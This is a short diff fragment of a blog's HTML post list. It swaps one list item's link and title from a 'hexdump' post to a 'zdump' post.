     
       <li class="post">
-        <a href="/blog/hexdump/">hexdump</a>
+        <a href="/blog/zdump/">zdump</a>
       </li>
     
   </ul>
